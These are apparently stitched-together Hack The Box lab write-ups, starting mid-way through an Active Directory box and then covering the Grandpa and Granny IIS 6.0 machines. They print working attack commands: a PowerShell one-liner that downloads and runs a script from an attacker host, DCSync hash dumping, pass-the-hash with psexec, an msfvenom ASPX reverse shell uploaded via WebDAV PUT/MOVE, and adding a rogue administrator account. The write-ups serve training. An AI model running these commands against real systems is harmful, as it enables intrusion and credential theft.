![](https://miro.medium.com/max/870/1*-v16S627q0fJcxkP7EV-gQ.png)

Give the user DCSync privileges. We’ll use PowerView for this. First download [Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) and setup a python server in the directory it resides in.

```text
python -m SimpleHTTPServer 5555
```

Then download the script on the target machine.

```text
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.45:5555/PowerView.ps1')
```

Use the _Add-DomainObjectAcl_ function in PowerView to give the user DCSync privileges.

```text
$pass = convertto-securestring 'password' -AsPlainText -Force$cred = New-Object System.Management.Automation.PSCredential('htb\rana', $pass)Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity rana -Rights DCSync
```

On the attack machine, use the [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) Impacket script to dump the password hashes of all the users on the domain.

```text
impacket-secretsdump htb.local/rana:password@10.10.10.161
```

We get back the following result.

![](https://miro.medium.com/max/1282/1*JAQEZrr25tXnVVJB1U6TvQ.png)

Use the [psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) Impacket script to perform a pass the hash attack with the Administrator’s hash.

```text
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```

We get a shell!

![](https://miro.medium.com/max/1311/1*zpRXRpDak9HjctGhr-r38g.png)

Grab the _root.txt_ flag.

![](https://miro.medium.com/max/674/1*kvYdA9aRT3jgQur8ZvcIkw.png)

## Lessons Learned <a id="45fb"></a>

To gain an initial foothold on the box we exploited three vulnerabilities.

1. SMB null session authentication. We were able to authenticate to the host without having to enter credentials. As an unauthenticated remote attacker, we leveraged this vulnerability to enumerate the list of users on the domain. Null sessions should be restricted or disabled on the server.
2. Kerberos pre-authentication disabled. After enumerating the list of users on the domain, we ran a script that checked if kerberos pre-authentication was disabled on any of the user accounts. We found that was the case for one of the service accounts. Therefore, we sent a dummy request for authentication and the KDC responded with a TGT encrypted with the user’s password. Kerberos pre-authentication should be enabled for all user accounts.
3. Weak authentication credentials. After getting a TGT encrypted with the user’s password, we passed that TGT to a password cracker and cracked the user’s password. This allowed us to authenticate as the user and gain an initial foothold on the box. The user should have used a stronger password that is difficult to crack.

To escalate privileges we exploited one vulnerability.

1. Misconfigured AD domain object permissions. After gaining an initial foothold on the box, we discovered \(using bloodhound\) that our user is a member of two groups. However, these groups were members of other groups, and those groups were members of other groups and so on \(known as nested groups\). Therefore, our user inherited the rights of the parent and grandparent groups. This allowed a low privileged user not only to create users on the domain but also allowed the user to give these users DCSync privileges. These privileges allow an attacker to simulate the behaviour of the Domain Controller \(DC\) and retrieve password hashes via domain replication. This gave us the administrator hash, which we used in a pass the hash attack to gain access to the administrator’s account. Least privilege policy should be applied when configuring permissions.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
grandpa-writeup-w-metasploit.md
# Grandpa Writeup w/ Metasploit

![](https://miro.medium.com/max/591/1*wourt1uR7Cu9Q-cp-eIo1w.png)

## Reconnaissance <a id="4e50"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.14 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.14Host is likely running Windows---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-17 15:29 EST
Nmap scan report for 10.10.10.14
Host is up (0.043s latency).
Not shown: 999 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 7.19 seconds---------------------Starting Nmap Basic Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-17 15:29 EST
Nmap scan report for 10.10.10.14
Host is up (0.037s latency).PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Error
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Mon, 17 Feb 2020 20:31:32 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  WebDAV type: Unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.32 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-17 15:29 EST
Nmap scan report for 10.10.10.14
Host is up.                                                                                                                                            
All 1000 scanned ports on 10.10.10.14 are open|filtered                                                                                                
                                                                                                                                                       
Nmap done: 1 IP address (1 host up) scanned in 201.72 seconds                                                                                          
                                                                                                                                                       
                                                                                                                                                       
                                                                                                                                                       
---------------------Starting Nmap Full Scan----------------------                                                                                     
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-17 15:32 EST                                                                                        
Initiating Parallel DNS resolution of 1 host. at 15:32                                                                                                 
Completed Parallel DNS resolution of 1 host. at 15:32, 0.43s elapsed                                                                                   
Initiating SYN Stealth Scan at 15:32
Scanning 10.10.10.14 [65535 ports]
Discovered open port 80/tcp on 10.10.10.14
....
Nmap scan report for 10.10.10.14
Host is up (0.039s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  httpRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 263.21 seconds
           Raw packets sent: 131268 (5.776MB) | Rcvd: 214 (10.752KB)No new ports---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                       
Running CVE scan on basic ports
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-17 15:37 EST
/usr/local/bin/nmapAutomator.sh: line 226:  2251 Segmentation fault      $nmapType -sV --script vulners --script-args mincvss=7.0 -p$(echo "${ports}") -oN nmap/CVEs_"$1".nmap "$1"Running Vuln scan on basic ports
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-17 15:37 EST
/usr/local/bin/nmapAutomator.sh: line 226:  2253 Segmentation fault      $nmapType -sV --script vuln -p$(echo "${ports}") -oN nmap/Vulns_"$1".nmap "$1"---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                                                                                       
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.asp,.php -u http://10.10.10.14:80 -o recon/gobuster_10.10.10.14_80.txt
nikto -host 10.10.10.14:80 | tee recon/nikto_10.10.10.14_80.txtWhich commands would you like to run?                                                                                                                  
All (Default), gobuster, nikto, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                                                                                       
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.14:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,asp,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/17 15:38:11 Starting gobuster
===============================================================
http://10.10.10.14:80/_vti_bin (Status: 301) [Size: 158]
http://10.10.10.14:80/_vti_bin/_vti_aut/author.dll (Status: 200) [Size: 195]
http://10.10.10.14:80/_vti_bin/_vti_adm/admin.dll (Status: 200) [Size: 195]
http://10.10.10.14:80/_vti_bin/shtml.dll (Status: 200) [Size: 96]
===============================================================
2020/02/17 15:39:06 Finished
===============================================================Finished gobuster scan
                                                                                                                                                       
=========================
                                                                                                                                                       
Starting nikto scan
                                                                                                                                                       
- Nikto v2.1.6
--------------------------------------------------------------------
+ Target IP:          10.10.10.14
+ Target Hostname:    10.10.10.14
+ Target Port:        80
+ Start Time:         2020-02-17 15:39:07 (GMT-5)
--------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (PROPPATCH COPY LOCK PROPFIND MKCOL UNLOCK SEARCH listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://10.10.10.14/
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ Retrieved x-aspnet-version header: 1.1.4322
+ 8014 requests: 0 error(s) and 22 item(s) reported on remote host
+ End Time:           2020-02-17 15:45:00 (GMT-5) (353 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                                                                                       
=========================
                                                                                                                                                       
                                                                                                                                                       
                                                                                                                                                       
---------------------Finished all Nmap scans---------------------Completed in 15 minute(s) and 46 second(s)
```

We have one port open.

* **Port 80:** running Microsoft IIS httpd 6.0

Before we move on to enumeration, let’s make some mental notes about the scan results.

* The only port that is open is port 80 so this will definitely be our point of entry. The port is running an outdated version of Microsoft IIS and is using the WebDAV protocol. One thing that pops out right away is the number of allowed HTTP methods. As mentioned in the scan results, these methods could potentially allow you to add, delete and move files on the web server.

## Enumeration <a id="063c"></a>

Visit the web application in the browser.

![](https://miro.medium.com/max/565/1*gV1XwZQATrEYcYyVhT2Q7g.png)

Look into the directories/files that gobuster found. We don’t find anything useful. Next, let’s test the allowed HTTP methods.

The scan shows that the HTTP PUT method is allowed. This could potentially give us the ability to save files on the web server. Since this is an IIS Microsoft web server, the type of files it executes are ASP and ASPX. So let’s check if we’re allowed to upload these file extensions.

```text
davtest --url http://10.10.10.14
```

We get back the following result.

![](https://miro.medium.com/max/826/1*o7yQ8L1djScSYbMvs2bZSg.png)

Unlike the [Granny box](https://medium.com/@ranakhalil101/hack-the-box-granny-writeup-w-o-and-w-metasploit-f7a1c11363bb), there are restrictions put in place that don’t allow us to upload files, so this won’t be the way we gain initial access to the box. Next, let’s run searchsploit on the web server version.

![](https://miro.medium.com/max/1382/1*EWgvfAf1pdhGGXt_GPlIUg.png)

Microsoft IIS 6.0 is vulnerable to a remote buffer overflow.

**Note**: Several people I know have tried to solve this box without using Metasploit and have failed to because the shell you get back is too unstable. Therefore, I’ll be solving this box using Metasploit.

## Initial Foothold <a id="03d0"></a>

Start up Metasploit.

```text
msfconsole
```

Viewing the exploit on [exploitdb](https://www.exploit-db.com/exploits/41738) we get a CVE \# [2017–7269](https://nvd.nist.gov/vuln/detail/CVE-2017-7269). Let’s see if Metasploit has an exploit for it.

![](https://miro.medium.com/max/1416/1*YSeviXOxwO4jvqqEELLxtQ.png)

It does. Let’s switch to that exploit and configure the RHOST to the Grandpa IP address.

![](https://miro.medium.com/max/1424/1*gcPLwfg5k7yYp-us-t_RJg.png)

Then run the exploit.

![](https://miro.medium.com/max/1231/1*dogBmAWzkg1mkambZ6GFHw.png)

We get a shell! However, when we run the “_getuid_” command, we get an operation failed error. This is because we’re running in an unstable process. To fix that, let’s see which processes are running on the box and migrate to one that is running with the same privileges that the meterpreter session is running with.

![](https://miro.medium.com/max/1411/1*_dxjVa8Pcoi_1SxbhViQcw.png)

Let’s migrate to process \# 2172 and try running the “_getuid_” command again.

![](https://miro.medium.com/max/873/1*d0cLgfl2DsWaizomawPdZQ.png)

Perfect! We have a stable working meterpreter session. We’re running with low privileges, so we’ll need to escalate our privileges to SYSTEM.

## Privilege Escalation <a id="580f"></a>

Background the meterpreter session.

![](https://miro.medium.com/max/682/1*uMOV4-rYPWbv1RBMqOW_IQ.png)

We’ll use the Local Exploit Suggester module to check the box for local vulnerabilities.

![](https://miro.medium.com/max/1418/1*4NEdHnwrClCg9Ic-pJ7LHQ.png)

Run the Local Exploit Suggester.

![](https://miro.medium.com/max/1418/1*McLipzNT4p9QlBHrW-bOrw.png)

We’ll use MS14–070 to escalate privileges.

![](https://miro.medium.com/max/1414/1*SAuuUM8WBkbEuQqw_Kn3Hw.png)

The exploit was successful! Let’s go back and enter our meterpreter session and view our privilege level.

![](https://miro.medium.com/max/1251/1*Dek6r7bgOFKEtAAabaQ5ew.png)

We’re SYSTEM! Grab the _user.txt_ and _root.txt_ flags.

![](https://miro.medium.com/max/1335/1*tThZ91D2TDVHxdqInHbLXQ.png)

## Lessons Learned <a id="a815"></a>

We gained initial access to the machine and escalated privileges by exploiting known vulnerabilities that had patches available. So it goes without saying, you should always update your software!

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
granny-writeup-w-o-and-w-metasploit.md
# Granny Writeup w/o and w/ Metasploit

![](https://miro.medium.com/max/591/1*jWdo04_CL9kjnTeBjz8g_A.png)

## Reconnaissance <a id="13b7"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.15 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.15Host is likely running Windows---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 23:16 EST
Nmap scan report for 10.10.10.15
Host is up (0.043s latency).
Not shown: 999 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 6.17 seconds---------------------Starting Nmap Basic Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 23:16 EST
Nmap scan report for 10.10.10.15
Host is up (0.036s latency).PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|_  Server Date: Mon, 17 Feb 2020 04:18:34 GMT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.82 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                                                        
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 23:16 EST
Nmap scan report for 10.10.10.15
Host is up.
All 1000 scanned ports on 10.10.10.15 are open|filteredNmap done: 1 IP address (1 host up) scanned in 201.63 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                                        
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 23:19 EST
Initiating Parallel DNS resolution of 1 host. at 23:19
Completed Parallel DNS resolution of 1 host. at 23:19, 0.02s elapsed
Initiating SYN Stealth Scan at 23:19
Scanning 10.10.10.15 [65535 ports]
....
Nmap scan report for 10.10.10.15
Host is up (0.042s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  httpRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 262.89 seconds
           Raw packets sent: 131269 (5.776MB) | Rcvd: 201 (8.844KB)No new ports---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                                        
Running CVE scan on basic ports
                                                                                                                                                                        
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 23:24 EST
Nmap scan report for 10.10.10.15
Host is up (0.037s latency).PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.48 secondsRunning Vuln scan on basic ports
                                                                                                                                                                        
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 23:24 EST
/usr/local/bin/nmapAutomator.sh: line 226:  2038 Segmentation fault      $nmapType -sV --script vuln -p$(echo "${ports}") -oN nmap/Vulns_"$1".nmap "$1"---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                                                                                                        
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.asp,.php -u http://10.10.10.15:80 -o recon/gobuster_10.10.10.15_80.txt
nikto -host 10.10.10.15:80 | tee recon/nikto_10.10.10.15_80.txtWhich commands would you like to run?                                                                                                                                   
All (Default), gobuster, nikto, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                                                                                                        
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.15:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,asp,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/16 23:25:19 Starting gobuster
===============================================================
http://10.10.10.15:80/_private (Status: 301) [Size: 156]
http://10.10.10.15:80/_vti_bin (Status: 301) [Size: 158]
http://10.10.10.15:80/_vti_bin/_vti_adm/admin.dll (Status: 200) [Size: 195]
http://10.10.10.15:80/_vti_bin/shtml.dll (Status: 200) [Size: 96]
http://10.10.10.15:80/_vti_bin/_vti_aut/author.dll (Status: 200) [Size: 195]
http://10.10.10.15:80/_vti_inf.html (Status: 200) [Size: 1754]
http://10.10.10.15:80/_vti_log (Status: 301) [Size: 158]
http://10.10.10.15:80/aspnet_client (Status: 301) [Size: 161]
http://10.10.10.15:80/images (Status: 301) [Size: 152]
http://10.10.10.15:80/Images (Status: 301) [Size: 152]
http://10.10.10.15:80/postinfo.html (Status: 200) [Size: 2440]
===============================================================
2020/02/16 23:26:16 Finished
===============================================================Finished gobuster scan
                                                                                                                                                                        
=========================
                                                                                                                                                                        
Starting nikto scan
                                                                                                                                                                        
- Nikto v2.1.6
--------------------------------------------------------------------
+ Target IP:          10.10.10.15
+ Target Hostname:    10.10.10.15
+ Target Port:        80
+ Start Time:         2020-02-16 23:26:18 (GMT-5)
--------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-397: HTTP method 'PUT' allows clients to save files on the web server.
+ OSVDB-5646: HTTP method 'DELETE' allows clients to delete files on the web server.
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (UNLOCK PROPFIND COPY MKCOL SEARCH LOCK PROPPATCH listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://granny/_vti_bin/_vti_aut/author.dll
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_private/: FrontPage directory found.
+ OSVDB-3233: /_vti_bin/: FrontPage directory found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3300: /_vti_bin/: shtml.exe/shtml.dll is available remotely. Some versions of the Front Page ISAPI filter are vulnerable to a DOS (not attempted).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ 8018 requests: 0 error(s) and 32 item(s) reported on remote host
+ End Time:           2020-02-16 23:32:39 (GMT-5) (381 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                                                                                                        
=========================
                                                                                                                                                                        
                                                                                                                                                                        
                                                                                                                                                                        
---------------------Finished all Nmap scans---------------------Completed in 16 minute(s) and 19 second(s)
```

We have one port open.

* **Port 80:** running Microsoft IIS httpd 6.0

Before we move on to enumeration, let’s make some mental notes about the scan results.

* The only port that is open is port 80 so this will definitely be our point of entry. The port is running an outdated version of Microsoft-IIS and is using the WebDAV protocol. One thing that pops out right away is the number of allowed HTTP methods. As mentioned in the scan results, these methods could potentially allow you to add, delete and move files on the web server.

## Enumeration <a id="c787"></a>

Visit the web application in the browser.

![](https://miro.medium.com/max/680/1*Glpdq9HYu8mnOML2wcZNYA.png)

Look into the directories/files that gobuster found. We don’t find anything useful. Next, let’s test the allowed HTTP methods.

The scan shows that the HTTP PUT method is allowed. This could potentially give us the ability to save files on the web server. Since this is a Microsoft IIS web server, the type of files it executes are ASP and ASPX. So let’s check if we’re allowed to upload these file extensions.

```text
davtest --url http://10.10.10.15
```

We get back the following result.

![](https://miro.medium.com/max/1021/1*JgL3sYZp_tWhx7JDIf-2xA.png)

Both ASP and ASPX are not allowed. However, TXT and HTML files are. Remember that the PUT HTTP method was not the only method that was allowed. We also can use the MOVE method. The MOVE method not only can be used to change file locations on the web server, but it can also be used to rename files. Let’s try to upload an HTML file on the web server and then rename it to change the extension to an ASPX file.

```text
root@kali:~/Desktop/htb/granny# curl -X PUT http://10.10.10.15/test.html -d @test.html
root@kali:~/Desktop/htb/granny# curl http://10.10.10.15/test.html
<h1>Hello</h1>
```

We confirm that the HTML file was correctly uploaded on the web server. Next, let’s change the extension of the HTML file to ASPX.

```text
root@kali:~/Desktop/htb/granny# curl -X MOVE --header 'Destination:http://10.10.10.15/test.aspx' 'http://10.10.10.15/test.html'root@kali:~/Desktop/htb/granny# curl http://10.10.10.15/test.aspx
<h1>Hello</h1>
```

Perfect! Now we have confirmed that we can successfully upload and execute ASPX code on the web server.

## Initial Foothold <a id="03d0"></a>

Generate an ASPX reverse shell using msfvenom.

```text
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.7 LPORT=1234 -o shell.aspx
```

* **-p**: payload
* **-f**: format
* **LHOST**: attack machine’s \(kali\) IP address
* **LPORT**: the port you want to send the reverse shell to
* **-o**: where to save the payload

Rename the file to _shell.txt_ so that we can upload it on the server.

```text
mv shell.aspx shell.txt
```

Then upload the file on the web server and change the file extension to ASPX.

```text
curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txtcurl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' 'http://10.10.10.15/shell.txt'
```

Next, set up a listener on your attack machine.

```text
nc -nlvp 1234
```

Execute the _shell.aspx_ file \(either through the browser or the _curl_ command\) to send a shell back to our attack machine.

![](https://miro.medium.com/max/744/1*yycN8mBgy0owbvD8-abFXQ.png)

We get a shell! Unfortunately, we don’t have permission to view the _user.txt_ flag, so we need to escalate privileges.

![](https://miro.medium.com/max/504/1*Lni1TFZq3fyeukHzXdpfVw.png)

**Note**: This shell is unstable and seems to crash every minute or so. So the next couple of steps will have to be done in several sessions. If you don’t want to go through this torture, skip to the ****_**Extra Content**_ ****section that solves the box using Metasploit.

## Privilege Escalation <a id="580f"></a>

We’ll use [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) to identify any missing patches on the Windows target machine that could potentially allow us to escalate privileges.

First, download the script.

```text
git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
```

Next, install the dependencies specified in the readme document.

```text
pip install xlrd --upgrade
```

Update the database.

```text
./windows-exploit-suggester.py --update
```

This creates an excel spreadsheet from the Microsoft vulnerability database in the working directory.

The next step is to retrieve the system information from the target machine. This can be done using the “_systeminfo_” command.

![](https://miro.medium.com/max/808/1*eSTEpJth-qCyxsxdc6HcFA.png)

Copy the output and save it in the file “_systeminfo.txt_” on the attack machine. Then run the following command.

```text
./windows-exploit-suggester.py --database 2020-02-17-mssb.xls --systeminfo ../../htb/granny/systeminfo.txt
```

It outputs many vulnerabilities. I tried several of them, but none of them worked except for the [Microsoft Windows Server 2003 — Token Kidnapping Local Privilege Escalation](https://www.exploit-db.com/exploits/6705) exploit. Grab the executable [from here](https://github.com/Re4son/Churrasco) and transfer it to the attack machine in the same way we transferred the reverse shell.

Whatever command we include when running the executable file, the command will get executed with escalated privileges.

![](https://miro.medium.com/max/586/1*v2jCM2BLlE7v7nveldTcCA.png)

Let’s use the executable to add a user on the system that is part of the _Administrators_ group.

```text
churrasco.exe "net user test test /add && net localgroup Administrators test /add"
```

The command completes successfully.

![](https://miro.medium.com/max/589/1*43eVshFKzUhEi68sulCpPQ.png)

However, when I try to use the “_runas_” command to switch to that user it doesn’t work. Maybe User Account Control \(UAC\) is enabled and the “_runas_” command does not elevate your privileges. So I figured maybe I could get it working using PowerShell as explained in [this article](https://medium.com/@asfiyashaikh10/windows-privilege-escalation-using-sudo-su-ae5573feccd9), but PowerShell is not installed on the machine!

So all you can do is use the exploit to view the _user.txt_ and _root.txt_ flags. I however, like to get a privileged shell on each box I solve and so I’m going to use Metasploit to get a shell on this box.

## Extra Content: Metasploit Solution <a id="317c"></a>

I’m going to skim through this part since there are a ton of write ups out there that show how to solve this box using Metasploit.

First, create an ASPX meterpreter reverse shell.

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=8888 -f aspx > met-shell.aspx
```

Then upload the shell payload in the same way we did before.

```text
root@kali:~/Desktop/htb/granny# cp met-shell.aspx met-shell.txtroot@kali:~/Desktop/htb/granny# curl -X PUT http://10.10.10.15/met-shell.txt --data-binary @met-shell.txtroot@kali:~/Desktop/htb/granny# curl -X MOVE -H 'Destination: http://10.10.10.15/met-shell.aspx' http://10.10.10.15/met-shell.txt
```

Configure metasploit to receive the reverse shell.

```text
use exploit/multi/handler
set lhost tun0
set lport 8888
```

Confirm that the configuration was set properly using the “_options_” command.

![](https://miro.medium.com/max/1023/1*URuv3JpitFcQosEb7qgPUg.png)

